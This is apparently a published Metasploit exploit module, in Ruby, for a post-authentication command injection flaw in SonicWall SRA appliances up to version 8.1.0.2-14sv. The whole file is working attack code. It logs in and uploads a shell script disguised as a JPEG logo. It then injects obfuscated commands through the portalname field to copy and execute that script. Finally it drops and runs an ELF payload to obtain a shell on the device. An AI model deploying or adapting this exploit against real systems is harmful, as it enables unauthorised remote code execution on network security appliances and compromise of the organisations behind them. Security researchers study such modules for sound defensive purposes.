# Exploit Title: Sonicwall importlogo/sitecustomization CGI Remote Command Injection Vulnerablity
# Date: 12/25/2016
# Exploit Author: xort @ Critical Start
# Vendor Homepage: www.sonicwall.com
# Software Link: sonicwall.com/products/sra-virtual-appliance
# Version: 8.1.0.2-14sv
# Tested on: 8.1.0.2-14sv
#
# CVE : (awaiting cve)

# vuln1: importlogo.cgi / logo1 parameter (any contents can be uploaded)
# vuln2: sitecustomization.cgi / portalname (filename) parameter

# Description PostAuth Sonicwall SRA <= v8.1.0.2-14sv. This exploit leverages a command injection bug.
#
# xort @ Critical Start




require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = ExcellentRanking
	include  Exploit::Remote::Tcp
        include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sonicwall SRA <= v8.1.0.2-14sv remote exploit',
					'Description'    => %q{
					This module exploits a remote command execution vulnerability in
				the Sonicwall SRA Appliance Version <=  v8.1.0.2-14sv. The vulnerability exist in
				a section of the machine's adminstrative infertface for performing configurations
				related to on-connect scripts to be launched for users's connecting.
			},
			'Author'         =>
				[
					'xort@Critical Start', # vuln + metasploit module
				],
			'Version'        => '$Revision: 1 $',
			'References'     =>
				[
					[ 'none', 'none'],
				],
			'Platform'      => [ 'linux'],
			'Privileged'     => true,
			 'Arch'          => [ ARCH_X86 ],
                        'SessionTypes'  => [ 'shell' ],
                        'Privileged'     => false,

		        'Payload'        =>
                                {
                                  'Compat' =>
                                  {
                                        'ConnectionType' => 'find',
                                  }
                                },

			'Targets'        =>
				[
					['Linux Universal',
						{
								'Arch' => ARCH_X86,
								'Platform' => 'linux'
						}
					],
				],
			'DefaultTarget' => 0))

			register_options(
				[
					OptString.new('PASSWORD', [ false, 'Device password', "" ]),
			         	OptString.new('USERNAME', [ true, 'Device password', "admin" ]),
					OptString.new('CMD', [ false, 'Command to execute', "" ]),
					Opt::RPORT(443),
				], self.class)
	end

        def do_login(username, password_clear)
                vprint_status( "Logging into machine with credentials...\n" )

                # vars
                timeout = 1550;

                # send request
                res = send_request_cgi(
                {
                      'method'  => 'POST',
                      'uri'     => "/cgi-bin/userLogin",
		      'headers' => {
			   'Connection' => 'close',
			   'Content-Type' => 'application/x-www-form-urlencoded',
			   'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0',
	              },
                      'vars_post' => {
			   'username' => username,
			   'password' => password_clear,
			   'domain' => 'LocalDomain',
			   'loginButton' => 'Login',
			   'state' => 'login',
			   'login' => 'true',
			   'VerifyCert' => '0',
			   'portalname' => 'VirtualOffice',
			   'ajax' => 'true'
		       },
                }, timeout)

		swap = res.headers['Set-Cookie'].split('\n').grep(/(.*)swap=([^;]+);/){$2}[0]

                return swap
        end

        def upload_payload(swap_cookie, file_data)
                vprint_status( "Upload Payload..." )

                # vars
                timeout = 1550;

                upload_req = [
                [ "portalName","VirtualOffice" ],
                [ "defaultLogo","0" ],
                [ "uiVersion","2" ],
                [ "bannerBackground", "light" ]
                ]

                boundary = "---------------------------" + Rex::Text.rand_text_numeric(34)
                post_data = ""

		# assemble upload_req parms
                upload_req.each do |xreq|
                    post_data << "--#{boundary}\r\n"
                    post_data << "Content-Disposition: form-data; name=\"#{xreq[0]}\"\r\n\r\n"
                    post_data << "#{xreq[1]}\r\n"
                end

                # add malicious file
                post_data << "--#{boundary}\r\n"
                post_data << "Content-Disposition: form-data; name=\"logo1\"; filename=\"x.jpg\"\r\n"
		post_data << "Content-Type: image/jpeg\r\n\r\n"
                post_data << "#{file_data}\r\n"

		post_data << "--#{boundary}--\r\n"

                res = send_request_cgi({
                   'method' => 'POST',
                   'uri'    => "/cgi-bin/importlogo?uploadId=1",
                   'ctype'  => "multipart/form-data; boundary=#{boundary}",
                   'data'   => post_data,
                   'headers' =>
                        {
                                'UserAgent' => "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0",
				'Cookie' => 'swap='+swap_cookie+';',
                        }
                }, timeout)


        end


	def run_command(swap_cookie, cmd)

		vprint_status( "Running Command...\n" )

                # vars
                timeout = 1550;

		vprint_status("creating filename on target: #{cmd}\n")

                upload_req = [
                [ "portalname", cmd ],
                [ "portaltitle","Virtual Office" ],
                [ "bannertitle","Virtual Office" ],
                [ "bannermessage","<h1>Dell Sonicwall</h1>" ],
                [ "portalUrl","https://192.168.84.155/portal/xxx" ],
                [ "loginflag","on" ],
                [ "bannerflag","on" ],
                [ "httpOnlyCookieFlag","on" ],
                [ "cachecontrol","on" ],
                [ "uniqueness", "on" ],
                [ "duplicateLoginAction", "1" ],
                [ "livetilesmalllogo", "" ],
                [ "livetilemediumlogo", "" ],
                [ "livetilewidelogo", "" ],
                [ "livetilelargelogo", "" ],
                [ "livetilebackground", "#0085C3" ],
                [ "livetilename", "" ],
                [ "home2page", "on" ],
                [ "allowNetExtender", "on" ],
                [ "virtualpassagepage", "on" ],
                [ "cifsdirectpage", "on" ],
                [ "cifspage", "on" ],
                [ "cifsappletpage", "on" ],
                [ "cifsapplet", "on" ],
                [ "cifsdefaultfilesharepath", "" ],
                [ "home3page", "on" ],
                [ "showAllBookmarksTab", "on" ],
                [ "showDefaultTabs", "on" ],
                [ "showCopyright", "on" ],
                [ "showSidebar", "on" ],
                [ "showUserPortalHelpButton", "on" ],
                [ "userPortalHelpURL", "" ],
                [ "showUserPortalOptionsButton", "on" ],
                [ "homemessage", "<h1>Welcome to the Dell SonicWALL Virtual Office</h1>" ],
                [ "hptabletitle", "Virtual Office Bookmarks" ],
                [ "vhostName", "www.#{Rex::Text.rand_text_hex(32)}.com" ],
                [ "vhostAlias", "" ],
                [ "vhostInterface", "ALL" ],
                [ "vhostEnableKeepAlive", "on" ],
                [ "cdssodn", ".yahoo.com" ],
                [ "enableSSLForwardSecrecy", "0" ],
                [ "enableSSLProxyVerify", "0" ],
                [ "sslProxyProtocol", "0" ],
                [ "loginSchedule", "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" ],
                [ "formsection", "main" ],
                [ "doAdd", "1" ],
                [ "cgiaction", "1" ],
                [ "themename", "stylesonicwall" ],
                [ "onlinehelp", "" ],
                [ "tmp_currentVhostName", "" ],
                [ "tmp_currentVhostAlias", "" ],
                [ "tmp_currentVhostInterface", "ALL" ],
                [ "tmp_currentVhostIp", "" ],
                [ "tmp_currentVhostIPv6", "" ],
                [ "tmp_currentVhostEnableHTTP", "0" ],
                [ "tmp_currentVhostEnableKeepAlive", "1" ],
                [ "tmp_currentVhostCert", "" ],
                [ "tmp_currEnforceSSLProxyProtocol", "0" ],
                [ "tmp_currSSLProxyProtocol", "0" ],
                [ "tmp_currEnableSSLProxyVerify", "0" ],
                [ "tmp_currEnableSSLForwardSecrecy", "0" ],
                [ "tmp_currentVhostOffloadRewrite", "" ],
                [ "restartWS", "1" ],
                [ "reuseFavicon", "" ],
                [ "oldReuseFavicon", "" ],
                ]

                boundary = "---------------------------" + Rex::Text.rand_text_numeric(34)
                post_data = ""

                # assemble upload_req parms
                upload_req.each do |xreq|
                    post_data << "--#{boundary}\r\n"
                    post_data << "Content-Disposition: form-data; name=\"#{xreq[0]}\"\r\n\r\n"
                    post_data << "#{xreq[1]}\r\n"
                end

                post_data << "--#{boundary}--\r\n"

                res = send_request_cgi({
                   'method' => 'POST',
                   'uri'    => "/cgi-bin/sitecustomization",
                   'ctype'  => "multipart/form-data; boundary=#{boundary}",
                   'data'   => post_data,
                   'headers' =>
                        {
                                'UserAgent' => "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0",
                                'Cookie' => 'swap='+swap_cookie+';',
                        }
                }, timeout)
	end

	def run_command_file(swap_cookie)

		# use prefix so exploit can be re-used (unique portalname requirment)
		prefix = Rex::Text.rand_text_numeric(5)

		run_command(swap_cookie, "#{prefix}$({find,$({perl,-e,'print(chr(0x2f))'}),-name,VirtualOffice.gif,-exec,cp,{},qz,$({perl,-e,'print(chr(0x3b))'})})")
		run_command(swap_cookie, "#{prefix}$({chmod,777,qz})")
		run_command(swap_cookie, "#{prefix}$({sh,-c,.$({perl,-e,'print(chr(0x2f))'})qz})")

	end

	def exploit
		# timeout
		timeout = 1550;

		# params
		password_clear = datastore['PASSWORD']
		user = datastore['USERNAME']

		# do authentication
		swap_cookie = do_login(user, password_clear)

		vprint_status("authenticated 'swap' cookie: #{swap_cookie}\n")

		# pause to let things run smoothly
		#sleep(5)

		 #if no 'CMD' string - add code for root shell
                if not datastore['CMD'].nil? and not datastore['CMD'].empty?

                        cmd = datastore['CMD']

                        # Encode cmd payload
                        encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2')

                        # kill stale calls to bdump from previous exploit calls for re-use
                        upload_payload(swap_cookie, ("sudo /bin/rm -f /tmp/n; printf \"#{encoded_cmd}\" > /tmp/n; chmod +rx /tmp/n; /tmp/n" ))
                else
                        # Encode payload to ELF file for deployment
                        elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
                        encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2')

			# upload elf to /tmp/m , chmod +rx /tmp/m , then run /tmp/m (payload)
                        upload_payload(swap_cookie, ("#!/bin/bash\necho -e \"#{encoded_elf}\" > /tmp/m; chmod +rx /tmp/m; /tmp/m"))
                        run_command_file(swap_cookie)

			# wait for magic
                        handler

                end


	end
end